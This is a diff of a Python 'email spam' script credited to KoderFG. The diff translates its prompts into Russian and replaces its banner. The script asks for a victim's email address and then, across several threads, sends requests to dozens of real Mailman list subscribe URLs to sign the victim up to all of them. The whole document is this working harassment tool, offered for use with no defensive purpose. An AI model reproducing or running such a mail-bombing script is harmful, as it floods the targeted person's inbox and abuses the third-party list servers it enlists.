@@ -13,21 +13,23 @@ def spam():
 	for i in urls:
 		count += 1
 		try:
-			requests.get(i, timeout=2); print(colorama.Fore.YELLOW + "Spam email №{} sent to {}".format(count, colorama.Fore.WHITE + spam_id))
+			requests.get(i, timeout=2); print(colorama.Fore.YELLOW + "Спам по электронной почте №{} отправленный в {}".format(count, colorama.Fore.WHITE + spam_id))
 		except:
-			print(colorama.Fore.RED + "Service ERROR №" + str(count))
+			print(colorama.Fore.RED + "Служебная ОШИБКА Отправки Спама №" + str(count))
 
 
 print(colorama.Fore.GREEN + """
-___________                 .__ .__     _________                         
-\\_   _____/  _____  _____   |__||  |   /   _____/______ _____     _____   
- |    __)_  /     \\ \\__  \\  |  ||  |   \\_____  \\ \\____ \\__  \\   /     \\  
- |        \\|  Y Y  \\ / __ \\_|  ||  |__ /        \\|  |_> >/ __ \\_|  Y Y  \\ 
-/_______  /|__|_|  /(____  /|__||____//_______  /|   __/(____  /|__|_|  / 
-        \\/       \\/      \\/                   \\/ |__|        \\/       \\/  """ + colorama.Fore.CYAN + "\n 			by KoderFG (telegram) \n ----------------------------------\n\n")
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+Ms::::::::mM+:::oMMd::::dMMMMMMMMMMMs::dMs::dMMMMMMMMMd+::::/sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+M/  .+++++mM-  ` dM: `  hMMdhyyyhmMMy++dM/  hMMMMMMMMm` `sy+:/yMNhhmdyydNMMNdyyyydNMMhhdmyyhmmhyhmMM
+M/  `....:MM- .+ :y `+  hMs-`:/. `hM/  yM/  hMMMMMMMMM+.```.:+dMy  .//  :NN:..//  -MN  `:-  .::  .NM
+M/  -hhhhdMM- .m` ` so  hMy+:++-  oM/  yM/  hMMMMMMMMmyssdy/  `Ny  :MM-  dNo//++`  NN  `NN`  mM-  dM
+M/  `.....yM- .Ms  .No  hN` `//-  oM/  yM/  hMMMMMMMMd. `/o:  +My  `++  -Ns  -+/`  NN  `MM`  NM-  dM
+MdyyyyyyyymMhyhMNyydMmyyNMmysshNyydMdyymMdyyNNmmmmmmmMNdyssshmMMy  :hsshNMNhssymdyyNMyyhMMyyyMMhyyNM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmddddddmMMMMMMMMMMMh--oMMMMMMMMMMMMM By KoderFG MMMMMMM""" + colorama.Fore.BLUE + "\n\n\n -----------------! Представляет KoderFG !-----------------\n\n")
 
 
-spam_id = input(colorama.Fore.MAGENTA + "Type victim`s email here: " + colorama.Fore.WHITE)
+spam_id = input(colorama.Fore.MAGENTA + "1) Введите адрес электронной почты жертвы здесь: " + colorama.Fore.WHITE)
 urls = ["http://ml.ci.uc.pt/mailman/subscribe/archport?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://flybynews.com/mailman/subscribe/flybynews_flybynews.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://www.winehq.org/mailman/subscribe/wine-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
@@ -193,5 +195,5 @@ urls = ["http://ml.ci.uc.pt/mailman/subscribe/archport?email="+spam_id+"&fullnam
 ,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-bannatyne?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-fort-garry?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"]
 
-for i in range(int(input(colorama.Fore.MAGENTA + "Type threads here (for example: 10): " + colorama.Fore.WHITE))):
+for i in range(int(input(colorama.Fore.MAGENTA + "Введите темы здесь (например: 10): " + colorama.Fore.WHITE))):
 	threading.Thread(target=spam).start()
